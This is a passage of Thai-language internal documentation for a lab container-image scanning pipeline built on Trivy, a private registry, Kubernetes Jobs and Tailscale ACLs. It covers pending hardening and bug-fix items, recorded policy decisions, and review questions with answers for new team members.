- **ตรวจไฟล์:** md5 = ETag, หยุดโหลดทันทีถ้าใหญ่เกิน, ตรวจ path traversal / device / จำนวน entry โดยไม่แตกไฟล์
- **registry ไม่เป็นทางอ้อมแล้ว** (เดิมเป็นช่องโหว่สำคัญที่สุด): pull read-only / push ต้อง login / ACL ให้ worker แค่ pull / Job สแกนเป็นทางเดียวที่ image ของผู้ใช้เข้า registry ได้

### งานค้าง (เรียงตามความสำคัญ)
1. **test ของ `evaluate_report` และ `detect_archive_format`** policy คือหัวใจของ gate แต่ยังไม่มี test (มีแค่ test ของ push) ผลการทดสอบ policy ที่ผ่านมาเป็นการทดสอบด้วยมือครั้งเดียว ทั้งที่ `evaluate_report` ถูกแยกเป็นฟังก์ชันล้วนไว้ให้ test อยู่แล้ว ควรเพิ่ม pytest ด้วย report JSON ตัวอย่าง (fixable/unfixed CRITICAL, secret HIGH/LOW, report ว่าง) และ tar ประหลาด
2. **ยังไม่ได้ตรวจว่า Pod ของนักศึกษาออกไป registry ได้ไหม** (คำถามที่ค้างมาจากรีวิวรอบแรก) ต้องอ่าน `k8s/lab-isolation-networkpolicy.yaml` เรื่องที่น่าห่วงคือ lab pod ที่รันบน **master** จะออกไปด้วย IP ของ master ซึ่ง ACL ยอมให้เข้า :5002 ได้ ตอนนี้ยังต้องมีรหัสอยู่ (push ไม่ได้) แต่ควรปิด egress ของ lab pod ไป rn ทั้ง 5001/5002 ใน NetworkPolicy หรือ taint master ไม่ให้รับ lab pod
3. **404 ยังถูก retry:** `fetch` หยุดลองเมื่อเจอ 401/403/404 แต่ส่ง `retryable=True` reconciler จึงเปิด Job ใหม่ (เห็นได้จากแถว seed ที่โดนสองรอบ) 404 แปลว่าไฟล์หายแล้ว ควรเป็น `retryable=False` (401/403 retry ต่อได้ เพราะรอบใหม่ได้ URL ใหม่) แก้บรรทัดเดียว
4. **Secret ของ URL หายถ้า backend ล้มกลางทาง:** ถ้า backend ถูกหยุดระหว่าง "สร้าง Job แล้ว" กับ "สร้าง Secret" จะไม่มีใครสร้าง Secret ซ้ำ Pod ค้างที่ `Init:0/3` จนถึง deadline แล้วเสีย attempt ไปหนึ่งครั้ง ควรให้ reconciler ตรวจว่า Job ที่ ACTIVE มี Secret หรือยัง ถ้าไม่มีก็เรียก `launch_scan_job` ซ้ำ (ทำซ้ำได้อยู่แล้ว)
5. **โควตา retry น้อย:** `SCAN_MAX_ATTEMPTS = 2` รอบที่ล้มเพราะ infra (เครื่องพัก, Job หาย) ก็นับด้วย ถ้าเจอปัญหาชั่วคราวซ้ำ image ของอาจารย์จะเป็น `ERROR` และถูก reject ใน 7 วัน ควรเพิ่มเป็น 3 หรือไม่นับรอบที่ล้มเพราะ infra
6. **registry bind `0.0.0.0`** (ข้อ 8.4) เครื่องใน LAN เดียวกับ rn ข้าม ACL ได้
7. **ขนาดไฟล์สามจุดไม่ตรงกัน:** `MAX_ARCHIVE_BYTES` = 20 GiB, `emptyDir` = 15 Gi ซึ่งต้องจุทั้ง tar และงานของ Trivy ส่วน backend จำกัด `LAB_IMAGE_MAX_ARCHIVE_BYTES` (single PUT) ต่ำกว่านั้นอีก ถ้าไฟล์ใหญ่ใกล้ 15 Gi Pod จะถูก evict แล้ว retry จนเป็น `ERROR` โดยข้อความไม่บอกสาเหตุจริง ควรให้ runner ใช้ limit เดียวกับ backend และตั้ง `sizeLimit` ประมาณ 2 เท่าของ limit นั้น
8. **โหลด Trivy DB ใหม่ทุก Job:** ข้อดีคือ cache ไม่ถูกวางยาข้าม Pod แต่ทุกการสแกนต้องพึ่ง `mirror.gcr.io`/ghcr ถ้าโดน rate limit หรือเน็ตล่มจะ `ERROR` ทุกตัว และ DB ไม่ได้ตรวจลายเซ็น ทางที่ดีกว่าคือให้ timer บน rn ดึง DB มาเก็บใน camp registry วันละครั้ง แล้วให้ Job ใช้ `--db-repository` ชี้เข้าข้างใน
9. **symlink / hardlink ใน tar ชั้นนอกไม่ถูกตรวจ:** `detect_archive_format` ตรวจ path ของชื่อไฟล์ แต่ไม่ได้ตรวจปลายทางของ symlink หรือ hardlink ความเสี่ยงต่ำ เพราะ skopeo ไม่ได้แตกไฟล์ลงดิสก์และ rootfs เป็น read-only แต่ปิดได้ด้วยโค้ดไม่กี่บรรทัด (ปฏิเสธ `issym()`/`islnk()` ที่ปลายทางเป็น absolute หรือมี `..`)
10. **secret ใน `group_vars/all.yml` เป็นข้อความธรรมดา** (gitignore แล้ว) ควรย้ายไป `ansible-vault` และลบค่าที่ไม่ใช้ (`registry_users.ecr_sync`, `scan_runner_registry_port`)
11. **VM พักเครื่อง:** Job ค้าง, timer ของ ECR sync ไม่รันหลังตื่น และนาฬิกาเพี้ยน มาจากสาเหตุเดียวกัน ควรตั้งไม่ให้ mn / wn1 / rn พัก
12. **รีเซ็ต DB ขณะมี Job:** Job ของแถวเดิมอาจไปถึง `publish` แล้ว push image ที่ไม่มีแถวใน DB และถูก sync ขึ้น ECR (ซึ่งเป็น IMMUTABLE) ให้ลบ Job ก่อนรีเซ็ตทุกครั้ง (คำสั่งในข้อ 13)

### เรื่อง policy (เป็นการตัดสินใจ ไม่ใช่บั๊ก)
- FAIL เฉพาะ CRITICAL ที่มีเวอร์ชันแก้แล้ว ส่วน CRITICAL ที่ยังไม่มี fix และ HIGH ทั้งหมดผ่านเป็น warning หลวมแต่เหมาะกับ lab image ที่มักใช้ base ใหญ่
- Trivy ไม่ได้หา malware ผล PASS แปลว่า "ไม่พบปัญหาที่รู้จัก" ไม่ใช่ "ปลอดภัย" ถ้าต้องการชั้นนี้ต้องเพิ่ม ClamAV/YARA

### การตัดสินใจที่ทำไว้ (2026-10-29)
1. **worker → backend :8000 ปิด** backend อยู่บน WSL ที่ไม่ติด tag ถ้าวันหนึ่ง Pod ต้องเรียก backend ค่อยติด tag ให้เครื่องนั้น
2. **คนในทีมยังเข้า :5002 ได้ (ต้องมีรหัส)** เพราะ ACL ไม่มี deny การตัดพอร์ตเดียวต้องเขียน dst ของ member ใหม่ทั้งหมด เสี่ยงทำให้ทีมเข้าเครื่องไม่ได้
3. **basic auth บน HTTP ธรรมดา** รับได้ เพราะวิ่งใน Tailscale ที่เข้ารหัสด้วย WireGuard อยู่แล้ว
4. **รหัสของ Job อยู่ใน Secret ที่ Ansible สร้าง** ไม่ผ่าน backend

---

## 16. คำถามทบทวน

ลองตอบเองก่อนเปิดเฉลย ถ้าตอบได้ 8 ข้อขึ้นไปแปลว่าเข้าใจระบบนี้จริงแล้ว

<details><summary>1. ทำไม webhook ไม่สร้าง Job เองเลย ต้องรอ reconciler</summary>

webhook ต้องตอบเร็วและไม่ล้มตาม K8s ถ้าสร้าง Job ใน webhook แล้ว cluster ล่ม webhook จะ error และ Worker จะ retry ซ้ำ แยกเป็น "บันทึกเจตนา" (QUEUED) กับ "ทำให้เป็นจริง" (reconciler) ทำให้ทั้งสองส่วนพังแยกกันได้ และ reconciler เป็นเจ้าของ K8s คนเดียว ไม่มี race
</details>

<details><summary>2. ถ้า worker รู้รหัสของ user scanner จะ push เข้า registry ได้ไหม</summary>

ไม่ได้ ACL ไม่เปิด :5002 ให้ worker (ได้ `000`) และ :5001 เป็น read-only ข้อยกเว้นคือถ้า worker อยู่ใน LAN เดียวกับ rn แล้วต่อ IP ของ LAN ตรงๆ (ข้อ 8.4) ซึ่งตอนนั้นรหัสจะเป็นด่านสุดท้าย
</details>

<details><summary>3. ถ้าลบ nodeSelector ออก จะเกิดอะไร</summary>

Pod อาจไปลง worker แล้ว publish push ไม่ได้ (timeout เพราะ ACL) ได้ `ERROR retryable` → retry → ถ้าลง worker อีกก็เป็น ERROR และถูก reject ใน 7 วัน อาการคือ "บางไฟล์ผ่าน บางไฟล์ไม่ผ่าน แบบสุ่ม" ขึ้นกับว่า Pod ลงเครื่องไหน ซึ่ง debug ยากมากถ้าไม่รู้เรื่องนี้
</details>

<details><summary>4. ทำไม credential ไม่ผ่าน env ของ container publish</summary>

env ถูกเห็นได้จาก `kubectl describe pod` / `kubectl get pod -o yaml` (ถ้าใส่ค่าตรงๆ), crash dump และ process ลูกทุกตัวได้รับ env ไปด้วย Secret ที่ mount เป็นไฟล์ 0400 อ่านได้เฉพาะ process ที่ตั้งใจเปิดอ่าน และ runner ส่งต่อให้ skopeo ผ่าน authfile ที่ลบทิ้งทันที
</details>

<details><summary>5. ทำไม credential หายใช้ ERROR ไม่ retry แต่ push ล้มใช้ ERROR retry</summary>

credential หายคือปัญหาการตั้งค่า retry กี่รอบก็ไม่หายจนกว่าคนจะมาแก้ retry จึงเปลือง attempt เปล่าๆ ส่วน push ล้มอาจเกิดจากเครือข่ายสะดุดชั่วคราว รอบหน้ามีโอกาสสำเร็จ หลักคือ **retry เฉพาะความผิดพลาดชั่วคราว (transient)**
</details>

<details><summary>6. ถ้าแก้ runner.py แล้วรัน role scan-runner-image โดยไม่ขึ้นเวอร์ชัน จะเกิดอะไร</summary>

role จะ build ได้ build hash ใหม่ เทียบกับ hash ของ `1.1.0` ใน registry ไม่ตรง → fail พร้อมบอกให้ขึ้นเวอร์ชัน (กัน tag เดิมเปลี่ยนเนื้อหาใต้ Job ที่กำลังรัน) ต้องแก้เวอร์ชันให้ตรงกัน 4 ที่ (ข้อ 6.1)
</details>

<details><summary>7. pull container ไม่มีรหัส ทำไมไม่เป็นปัญหาความปลอดภัย</summary>

image ใน registry ผ่านการสแกนแล้วหรือเป็นของทีม ไม่มีความลับ (secret HIGH ขึ้นไปทำให้ FAIL) และ ACL จำกัดว่าใครเข้าได้ ส่วนการ "อ่าน" ไม่ทำให้ใครแทรก image ร้ายเข้ามาได้ ความเสี่ยงที่สำคัญคือการเขียน ซึ่งปิดไว้หมดแล้ว
</details>

<details><summary>8. ทำไม registry ไม่มีกฎ ACL ฝั่ง src เลย</summary>

rn ไม่ต้องเริ่มคุยกับเครื่องไหนใน tailnet (ecr-sync ออกอินเทอร์เน็ตตรง) การไม่ให้สิทธิ์เลยทำให้ถ้า rn ถูกยึด ผู้บุกรุกก็กระโดดต่อไป master / worker ผ่าน tailnet ไม่ได้ (การตอบกลับ connection ที่เครื่องอื่นเปิดมายังทำงานปกติ เพราะ ACL ดูแค่ฝั่งที่เริ่มเชื่อมต่อ)
</details>

<details><summary>9. ถ้าเปลี่ยนรหัสของ scanner ใน all.yml ต้องรันอะไรบ้าง และถ้าลืมรันอย่างหนึ่งจะเกิดอะไร</summary>

รัน role `registry` (อัปเดต htpasswd + recreate push container) และ `k3s-server --tags scan` (อัปเดต Secret) ถ้าลืมอย่างใดอย่างหนึ่ง รหัสสองฝั่งไม่ตรงกัน publish ได้ `unauthorized` → ERROR retryable → ล้มซ้ำจนเป็น ERROR
</details>

<details><summary>10. ทำไม role registry ต้องเช็ก htpasswd -v ก่อน ไม่เขียนใหม่ทุกครั้ง</summary>

bcrypt สุ่ม salt ทุกครั้ง เขียนใหม่ = ไฟล์เปลี่ยนทุกรอบ → checksum เปลี่ยน → config hash เปลี่ยน → push container ถูก recreate ทุกครั้งที่รัน role (registry หยุดให้บริการชั่วครู่โดยไม่จำเป็น) และ role จะไม่ idempotent (`changed` ตลอด) ทำให้มองไม่ออกว่ารอบไหนมีอะไรเปลี่ยนจริง
</details>

> **💡 Mentor:** อยากฝึกต่อ ลองหยิบงานค้างข้อ 1 หรือ 2 ในข้อ 15 มาทำ (เขียน test ของ `evaluate_report` /
> แก้ 404 ให้ไม่ retry) ทั้งสองข้อเล็ก มี test ให้ดูเป็นตัวอย่างแล้ว และจะบังคับให้อ่าน `runner.py` ทั้งไฟล์
> เป็นวิธีเรียนระบบที่เร็วที่สุด
